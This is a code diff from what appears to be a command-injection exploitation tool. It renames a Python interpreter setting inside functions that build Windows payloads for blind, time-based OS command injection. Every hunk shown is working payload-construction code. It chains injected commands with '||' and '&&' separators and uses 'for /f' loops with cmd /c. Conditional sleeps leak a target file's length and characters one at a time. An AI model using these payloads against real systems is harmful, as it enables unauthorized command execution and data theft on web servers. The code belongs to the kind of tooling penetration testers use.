@@ -111,7 +111,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
@@ -119,8 +119,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
@@ -130,8 +130,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_reque
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else:  
     if separator == ";" :
@@ -308,7 +308,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -319,8 +319,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
@@ -333,8 +333,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
     if separator == ";" :
@@ -473,15 +473,15 @@ __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
@@ -490,8 +490,8 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, t
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
     if separator == ";" :
@@ -616,15 +616,15 @@ __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     elif separator == "&&" :
       separator = _urllib.parse.quote(separator)
@@ -633,8 +633,8 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
     if separator == ";" :
